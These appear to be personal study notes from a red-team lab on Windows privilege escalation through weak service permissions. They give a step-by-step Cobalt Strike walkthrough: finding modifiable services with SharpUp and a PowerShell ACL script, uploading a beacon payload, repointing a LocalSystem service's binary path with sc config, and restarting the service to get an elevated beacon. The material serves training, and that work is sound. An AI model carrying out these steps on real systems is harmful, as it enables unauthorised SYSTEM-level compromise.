---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Weak Service Permissions]]  
___

## Description:  
Look for services that have **ChangeConfig** privileges and that run as an elevated user.

Use [SharpUp](https://github.com/GhostPack/SharpUp) or manually enumerate services that can be modified.

```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe

=== Modifiable Services ===

  Name             : Vuln-Service-2
  DisplayName      : Vuln-Service-2
  Description      : 
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Vuln Services\Service 2.exe"
```

We can use the PowerShell script below to enumerate further. [link](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)

```
`Add-Type`  `@"`

  `[System.FlagsAttribute]`

  `public enum ServiceAccessFlags : uint`

  `{`

      `QueryConfig = 1,`

      `ChangeConfig = 2,`

      `QueryStatus = 4,`

      `EnumerateDependents = 8,`

      `Start = 16,`

      `Stop = 32,`

      `PauseContinue = 64,`

      `Interrogate = 128,`

      `UserDefinedControl = 256,`

      `Delete = 65536,`

      `ReadControl = 131072,`

      `WriteDac = 262144,`

      `WriteOwner = 524288,`

      `Synchronize = 1048576,`

      `AccessSystemSecurity = 16777216,`

      `GenericAll = 268435456,`

      `GenericExecute = 536870912,`

      `GenericWrite = 1073741824,`

      `GenericRead = 2147483648`

  `}`

`"@`

`function` `Get-ServiceAcl` `{`

    `[``CmdletBinding``(DefaultParameterSetName=``"ByName"``)]`

    `param``(`

        `[``Parameter``(``Mandatory``=``$true``,` `Position``=0,` `ValueFromPipeline``=``$true``,` `ParameterSetName``=``"ByName"``)]`

        `[string[]]` `$Name``,`

        `[``Parameter``(``Mandatory``=``$true``,` `Position``=0,` `ParameterSetName``=``"ByDisplayName"``)]`

        `[string[]]` `$DisplayName``,`

        `[``Parameter``(``Mandatory``=``$false``,` `Position``=1)]`

        `[string]` `$ComputerName` `=` `$env:COMPUTERNAME`

    `)`

    `# If display name was provided, get the actual service name:`

    `switch` `(``$PSCmdlet``.``ParameterSetName``) {`

        `"ByDisplayName"` `{`

            `$Name` `=` `Get-Service` `-DisplayName` `$DisplayName` `-ComputerName` `$ComputerName` `-ErrorAction` `Stop |`

                `Select-Object` `-ExpandProperty` `Name`

        `}`

    `}`

    `# Make sure computer has 'sc.exe':`

    `$ServiceControlCmd` `=` `Get-Command` `"$env:SystemRoot\system32\sc.exe"`

    `if` `(``-not` `$ServiceControlCmd``) {`

        `throw` `"Could not find $env:SystemRoot\system32\sc.exe command!"`

    `}`

    `# Get-Service does the work looking up the service the user requested:`

    `Get-Service` `-Name` `$Name` `|` `ForEach-Object` `{`

        `# We might need this info in catch block, so store it to a variable`

        `$CurrentName` `=` `$_``.Name`

        `# Get SDDL using sc.exe`

        `$Sddl` `= &` `$ServiceControlCmd``.Definition` `"\\$ComputerName"` `sdshow` `"$CurrentName"` `|` `Where-Object` `{` `$_` `}`

        `try {`

            `# Get the DACL from the SDDL string`

            `$Dacl` `=` `New-Object` `System.Security.AccessControl.RawSecurityDescriptor(``$Sddl``)`

        `}`

        `catch {`

            `Write-Warning` `"Couldn't get security descriptor for service '$CurrentName': $Sddl"`

            `return`

        `}`

        `# Create the custom object with the note properties`

        `$CustomObject` `=` `New-Object` `-TypeName` `PSObject` `-Property` `(``[ordered]` `@{ Name =` `$_``.Name`

                                                                              `Dacl =` `$Dacl`

                                                                            `})`

        `# Add the 'Access' property:`

        `$CustomObject` `|` `Add-Member` `-MemberType` `ScriptProperty` `-Name` `Access` `-Value` `{`

            `$this``.Dacl.DiscretionaryAcl |` `ForEach-Object` `{`

                `$CurrentDacl` `=` `$_`

                `try {`

                    `$IdentityReference` `=` `$CurrentDacl``.SecurityIdentifier.Translate(``[System.Security.Principal.NTAccount]``)`

                `}`

                `catch {`

                    `$IdentityReference` `=` `$CurrentDacl``.SecurityIdentifier.Value`

                `}`

                `New-Object` `-TypeName` `PSObject` `-Property` `(``[ordered]` `@{`

                                `ServiceRights =` `[ServiceAccessFlags]` `$CurrentDacl``.AccessMask`

                                `AccessControlType =` `$CurrentDacl``.AceType`

                                `IdentityReference =` `$IdentityReference`

                                `IsInherited =` `$CurrentDacl``.IsInherited`

                                `InheritanceFlags =` `$CurrentDacl``.InheritanceFlags`

                                `PropagationFlags =` `$CurrentDacl``.PropagationFlags`

                                                                    `})`

            `}`

        `}`

        `# Add 'AccessToString' property that mimics a property of the same name from normal Get-Acl call`

        `$CustomObject` `|` `Add-Member` `-MemberType` `ScriptProperty` `-Name` `AccessToString` `-Value` `{`

            `$this``.Access |` `ForEach-Object` `{`

                `"{0} {1} {2}"` `-f` `$_``.IdentityReference,` `$_``.AccessControlType,` `$_``.ServiceRights`

            `} |` `Out-String`

        `}`

        `$CustomObject`

    `}`

`}`

```


Run the above script:

```
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty Access

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

```

We can see that all **Authenticated Users** have **ChangeConfig**, **Start** and **Stop** privileges over this service. We can abuse these weak permissions by changing the binary path of the service - so instead of it running `C:\Program Files\Vuln Services\Service 2.exe`, we can have it run something like `C:\Temp\payload.exe`.

Make sure you add a new listener and select beacon TCP first (I didnt check the bind to localhost checkbox, i am not sure when you would use this).

```
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\beacon-tcp-svc.exe
beacon> mv beacon-tcp-svc.exe fake-service.exe

beacon> run sc qc Vuln-Service-2
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Vuln-Service-2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Vuln Services\Service 2.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Vuln-Service-2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

beacon> run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe
[SC] ChangeServiceConfig SUCCESS

beacon> run sc qc Vuln-Service-2
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Vuln-Service-2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Temp\fake-service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Vuln-Service-2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

beacon> run sc query Vuln-Service-2

SERVICE_NAME: Vuln-Service-2 
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

beacon> run sc stop Vuln-Service-2
beacon> run sc start Vuln-Service-2
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (10:19 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
